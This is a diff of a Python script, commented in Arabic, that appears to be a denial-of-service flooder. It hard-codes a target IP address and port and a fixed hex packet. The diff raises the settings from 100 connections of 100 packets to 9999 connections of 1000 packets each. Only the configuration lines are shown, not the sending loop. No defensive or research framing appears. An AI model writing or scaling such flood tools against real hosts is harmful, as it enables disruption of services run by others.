@@ -1,11 +1,11 @@
 import socket
 import threading
 
-# إعدادات الاتصال (تم تحديد IP والمنفذ مسبقًا)
+# إعدادات الاتصال
 ip = "5.223.46.86"  # عنوان IP الهدف
 port = 10009  # المنفذ الهدف
-num_connections = 100  # عدد الاتصالات في كل دورة
-num_send_per_connection = 100  # عدد الحزم المرسلة لكل اتصال
+num_connections = 9999  # عدد الاتصالات
+num_send_per_connection = 1000  # عدد الحزم المرسلة لكل اتصال
 
 # الحزمة التي سيتم إرسالها
 packet = bytes.fromhex("F10400010900000001000000F1")
